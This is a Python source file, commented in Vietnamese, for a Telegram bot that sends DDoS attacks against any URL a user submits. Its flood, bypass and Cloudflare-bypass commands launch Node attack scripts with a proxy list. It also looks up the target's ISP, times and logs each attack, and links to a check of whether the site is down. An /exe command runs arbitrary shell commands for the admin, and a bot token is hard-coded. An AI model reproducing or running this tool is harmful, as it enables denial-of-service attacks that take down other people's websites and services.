import asyncio
import subprocess
import requests
import json
import socket
from telegram import Update
from telegram.ext import ApplicationBuilder, CommandHandler, ContextTypes
from urllib import parse
from datetime import datetime
import time
import pytz  # Import thư viện pytz để quản lý múi giờ

# Cấu hình
ALLOWED_USER_ID = 7371969470  # ID của admin
TOKEN = '7258312263:AAGIDrOdqp4vyqwMnB4-gALpK0rGjxkH4s4'

# Quản lý tiến trình tấn công
processes, task_info, attacked_urls = {}, {}, {}

# Escape HTML
def escape_html(text):
    return text.replace('&', '&amp;').replace('<', '&lt;').replace('>', '&gt;').replace('"', '&quot;').replace("'", '&#39;')

# Lấy IP và ISP thông tin
def get_ip_and_isp(url):
    try:
        ip = socket.gethostbyname(parse.urlsplit(url).netloc)
        if ip:
            response = requests.get(f"http://ip-api.com/json/{ip}")
            return ip, response.json() if response.ok else None
    except (socket.error, requests.exceptions.RequestException):
        return None, None

# Cập nhật thời gian còn lại và theo dõi tiến trình tấn công
async def run_attack(url, attack_time, update, method):
    user_id = update.effective_user.id
    heap_size = "--max-old-space-size=32768"  # 32GB (32768MB)
    
    # Chọn file tương ứng dựa trên phương thức
    if method == 'STRONGS-CF':
        command = f"node {heap_size} strongsflood.js {url} {attack_time} 10 10 live.txt"
    elif method == 'bypass':
        command = f"node {heap_size} tls-kill.js {url} {attack_time} 10 10 live.txt bypass"
    else:  # flood
        command = f"node {heap_size} tls-kill.js {url} {attack_time} 10 10 live.txt flood"
    
    try:
        print(f"Executing command: {command}")  # Hiển thị lệnh trong terminal
        
        # Thực thi lệnh Node.js bất đồng bộ
        process = await asyncio.create_subprocess_shell(
            command,
            stdout=asyncio.subprocess.PIPE,
            stderr=asyncio.subprocess.PIPE
        )

        # Thêm thông tin tiến trình vào task_info
        task_info[user_id] = task_info.get(user_id, [])
        task_info[user_id].append({
            "url": url,
            "method": method,
            "remaining_time": attack_time,
            "task_id": process.pid,
            "start_time": datetime.now(pytz.timezone("Asia/Ho_Chi_Minh")).strftime("%Y-%m-%d %H:%M:%S"),
            "message": None  # Placeholder for the message reference
        })

        # Lưu lại thông tin URL đã tấn công
        attacked_urls[user_id] = attacked_urls.get(user_id, [])
        attacked_urls[user_id].append({
            "url": url,
            "datetime": datetime.now(pytz.timezone("Asia/Ho_Chi_Minh")).strftime("%Y-%m-%d %H:%M:%S")
        })

        # Đọc và in đầu ra của tiến trình ngay khi có dữ liệu
        async def read_output():
            try:
                while True:
                    stdout_line = await process.stdout.readline()
                    if not stdout_line:
                        break
                    stdout_decoded = stdout_line.decode('utf-8').strip()
                    print(stdout_decoded)  # In trực tiếp vào terminal
            except Exception as e:
                print(f"Error reading stdout: {str(e)}")

        async def read_error():
            try:
                while True:
                    stderr_line = await process.stderr.readline()
                    if not stderr_line:
                        break
                    stderr_decoded = stderr_line.decode('utf-8').strip()
                    print(stderr_decoded)  # In lỗi trực tiếp vào terminal
            except Exception as e:
                print(f"Error reading stderr: {str(e)}")

        # Cập nhật thời gian còn lại và theo dõi tiến trình tấn công
        async def update_remaining_time():
            start_time = time.time()
            end_time = start_time + attack_time

            while True:
                elapsed_time = time.time() - start_time
                remaining_time = max(0, int(end_time - time.time()))  # Thời gian còn lại
                if remaining_time <= 0:
                    break  # Nếu thời gian đã hết, dừng cập nhật

                # Cập nhật thông tin tấn công mỗi giây
                task_text = f"🔴 Hiện tại có 1 tiến trình tấn công đang diễn ra:\n"
                task_text += f"URL: {escape_html(url)}, Phương thức: {method}, Thời gian bắt đầu: {datetime.now(pytz.timezone('Asia/Ho_Chi_Minh')).strftime('%Y-%m-%d %H:%M:%S')}\n"
                task_text += f"⏳ Thời gian còn lại: {remaining_time} giây"
                task_text += f"\n🔗 Kiểm tra trạng thái URL: [Check Host](https://check-host.net/check-http?host={parse.quote(url)})"

                if task_info[user_id][0]["message"] is None:
                    # Gửi tin nhắn lần đầu tiên
                    task_info[user_id][0]["message"] = await update.message.reply_text(task_text, parse_mode='Markdown')
                else:
                    # Cập nhật tin nhắn nếu đã gửi
                    await task_info[user_id][0]["message"].edit_text(task_text, parse_mode='Markdown')

                await asyncio.sleep(1)  # Chờ 1 giây rồi tiếp tục

        # Chạy song song cả 2 tác vụ đọc stdout và stderr
        asyncio.create_task(read_output())
        asyncio.create_task(read_error())
        # Cập nhật thời gian còn lại trong quá trình tấn công
        asyncio.create_task(update_remaining_time())

        # Chờ cho đến khi tấn công hoàn tất (không cập nhật thời gian còn lại nữa)
        await asyncio.sleep(attack_time)

        # Thông báo về việc hoàn tất tấn công
        await update.message.reply_text(f"Tấn công {method} vào URL {escape_html(url)} đã hoàn tất. ✅")

        # Xóa thông tin tiến trình trong processes và task_info sau khi hoàn thành
        task_info[user_id] = [task for task in task_info[user_id] if task["task_id"] != process.pid]

    except Exception as e:
        print(f"Exception occurred: {str(e)}")

# Lệnh tấn công
async def attack(update: Update, context: ContextTypes.DEFAULT_TYPE):
    try:
        url, attack_time = context.args[0], int(context.args[1]) if len(context.args) > 1 else 60
        method = 'STRONGS-CF' if '/strongs_cf' in update.message.text else ('bypass' if '/bypass' in update.message.text else 'flood')
        
        # Điều chỉnh thời gian tối đa cho người không phải admin
        if attack_time > 120 and update.effective_user.id != ALLOWED_USER_ID:
            return await update.message.reply_text("⚠️ Thời gian tấn công tối đa là 120 giây.")
        
        ip, isp_info = get_ip_and_isp(url)
        if not ip:
            return await update.message.reply_text("❌ Không thể lấy IP từ URL.")
        
        isp_info_text = json.dumps(isp_info, indent=2, ensure_ascii=False) if isp_info else ''
        await update.message.reply_text(f"Tấn công {method} đã được gửi bởi @{update.effective_user.username}!\nThông tin ISP của host {escape_html(url)}\n<pre>{escape_html(isp_info_text)}</pre>", parse_mode='HTML')
        
        # Sử dụng asyncio.create_task để thực thi tấn công một cách bất đồng bộ
        asyncio.create_task(run_attack(url, attack_time, update, method))

    except (IndexError, ValueError) as e:
        await update.message.reply_text(f"❌ Đã xảy ra lỗi: {str(e)}")

# Dừng tiến trình tấn công
async def stop(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    if not task_info.get(user_id):
        return await update.message.reply_text("🛑 Không có tiến trình tấn công nào đang chạy.")
    
    subprocess.run("ps aux | grep 'tls-kill.js\\|strongsflood.js' | grep -v grep | awk '{print $2}' | xargs kill -9", shell=True)
    task_info[user_id] = []
    await update.message.reply_text("✅ Tất cả các tấn công đã bị dừng.")

# Hiển thị các tiến trình tấn công đang chạy
async def task(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    if user_id not in task_info or not task_info[user_id]:
        await update.message.reply_text("📋 Hiện tại không có tấn công nào đang diễn ra.")
    else:
        task_text = f"🔴 Hiện tại có {len(task_info[user_id])} tiến trình tấn công đang diễn ra:\n"
        for info in task_info[user_id]:
            task_text += f"URL: {escape_html(info['url'])}, Phương thức: {info['method']}, Thời gian bắt đầu: {info['start_time']}\n"
        await update.message.reply_text(task_text)

# Hiển thị các URL đã tấn công
async def list_attacked(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    if user_id not in attacked_urls or not attacked_urls[user_id]:
        await update.message.reply_text("❌ Bạn chưa tấn công URL nào.")
    else:
        list_text = "📋 Các URL đã tấn công của bạn:\n"
        for attack in attacked_urls[user_id]:
            list_text += f"URL: {escape_html(attack['url'])}, Thời gian: {attack['datetime']}\n"
        await update.message.reply_text(list_text)

# Thực thi lệnh terminal
async def exe(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    if user_id != ALLOWED_USER_ID:
        return await update.message.reply_text("❌ Bạn không có quyền thực thi lệnh này.")

    if context.args:
        command = ' '.join(context.args)
        try:
            # Thực thi lệnh và lấy kết quả
            result = subprocess.run(command, shell=True, capture_output=True, text=True)
            output = result.stdout if result.stdout else result.stderr
            # Gửi kết quả trả về
            if output:
                await update.message.reply_text(f"🔧 Kết quả lệnh:\n<pre>{escape_html(output)}</pre>", parse_mode='HTML')
            else:
                await update.message.reply_text("⚠️ Không có kết quả từ lệnh.")
        except Exception as e:
            await update.message.reply_text(f"❌ Đã xảy ra lỗi khi thực thi lệnh: {str(e)}")
    else:
        await update.message.reply_text("❌ Vui lòng cung cấp lệnh để thực thi.")

# Hiển thị hướng dẫn sử dụng bot
async def help_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    help_info = {
        "/task": "📝 Hiển thị thông tin về tấn công hiện tại của bạn.",
        "/bypass [url] [time]": "⚡ Tấn công Bypass vào URL với thời gian (giây).",
        "/flood [url] [time]": "🌊 Tấn công Flood vào URL với thời gian (giây).",
        "/strongs_cf [url] [time]": "🔥 Tấn công STRONGS-CF vào URL với thời gian (giây).",
        "/stop": "⛔ Dừng tất cả tiến trình tấn công.",
        "/exe [lệnh]": "⚙️ Thực thi lệnh terminal và gửi kết quả về.",
        "/list": "📜 Hiển thị các URL đã tấn công.",
        "/help": "ℹ️ Hiển thị hướng dẫn sử dụng BOT - Lưu ý: Bot power kém không dùng để cạp site trâu bò nhé những đồng dâm.."
    }
    await update.message.reply_text(f"<pre>{escape_html(json.dumps(help_info, indent=2, ensure_ascii=False))}</pre>", parse_mode='HTML')

# Khởi chạy bot
def main():
    application = ApplicationBuilder().token(TOKEN).build()
    application.add_handler(CommandHandler("bypass", attack))
    application.add_handler(CommandHandler("flood", attack))
    application.add_handler(CommandHandler("strongs_cf", attack))  # Cập nhật lệnh với tên hợp lệ
    application.add_handler(CommandHandler("stop", stop))
    application.add_handler(CommandHandler("task", task))
    application.add_handler(CommandHandler("list", list_attacked))  # Thêm handler cho lệnh /list
    application.add_handler(CommandHandler("exe", exe))  # Thêm handler cho lệnh /exe
    application.add_handler(CommandHandler("help", help_command))
    application.run_polling()

if __name__ == "__main__":
    main()
